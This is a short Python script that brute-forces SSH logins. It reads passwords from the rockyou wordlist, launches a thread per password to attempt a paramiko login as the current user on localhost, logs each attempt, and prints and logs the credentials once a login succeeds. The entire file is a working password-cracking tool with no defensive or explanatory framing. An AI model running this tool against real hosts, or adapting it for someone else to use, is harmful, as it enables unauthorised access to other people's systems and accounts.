import os
import signal
import sys
import time
from getpass import getuser
from typing import Any
from paramiko import SSHClient, SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
from getpass import getuser
import threading
import logging


def log(message: str, level: str) -> None:
    logging.basicConfig(filename='cracking_ssh_login.log', filemode='a',
                        format='%(asctime)s - %(message)s')
    if level == 'error':
        logging.error(message)
    else:
        logging.info(message)


def login(data: dict[str, Any], host: str) -> None:
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh.connect(host, **data)
        stdin, stdout, stderr = ssh.exec_command('ls -l')
        if stdout.read().decode():
            log(f"Finded {data}", "info")
            print(f"Finded {data}")
            os.kill(os.getpid(), signal.SIGINT)
    except AuthenticationException as e:
        print(f"[-] {e}")
        log(str(e), 'error')
    except ssh_exception.SSHException as e:
        print(f"[-] {e}")
        log(str(e), 'error')


def read_password_file(filename: str):
    user = getuser()
    with open(filename, 'r') as file:
        for line in file:
            data = {
                    "username": user,
                    "password": line.strip(),
                    "port": 22,
                    "banner_timeout": 200
                    }
            print(data)
            threading.Thread(target=login, args=(data, "localhost")).start()
            time.sleep(0.2)


def main() -> None:
    read_password_file('rockyou.txt')


if __name__ == '__main__':
    main()
